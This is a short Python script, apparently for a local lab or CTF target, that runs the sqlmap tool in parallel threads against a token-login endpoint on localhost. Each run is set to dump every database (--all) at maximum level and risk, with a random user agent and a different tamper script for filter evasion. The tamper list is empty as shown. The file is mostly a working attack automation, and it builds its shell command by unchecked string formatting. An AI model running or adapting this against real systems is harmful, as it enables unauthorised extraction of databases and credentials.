tampers = []

import subprocess
import threading


def run_command(command):
    process = subprocess.Popen(
        command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
    )
    stdout, stderr = process.communicate()
    return stdout, stderr, process.returncode


# List to store the results of each command
results = []

# List to store the threads
threads = []


# Function to run a command in a separate thread
def run_command_thread(command):
    result = run_command(
        'sqlmap -u "http://localhost:8787/token_login" --data="access_token=1" --batch --dbms=mysql --all --ignore-code 400 --level=5 --risk=3 --random-agent --smart --tamper={}'.format(
            command
        )
    )
    results.append(result)


# Create a thread for each command and start them
for tamper in tampers:
    thread = threading.Thread(target=run_command_thread, args=(tamper,))
    threads.append(thread)
    thread.start()

# Wait for all threads to finish
for thread in threads:
    thread.join()

# Print the results
for command, result in zip(tampers, results):
    stdout, stderr, returncode = result
    print(f"Command: {command}")
    print(f"stdout: {stdout.decode()}")
    print(f"stderr: {stderr.decode()}")
    print(f"returncode: {returncode}")
    print("=" * 40)
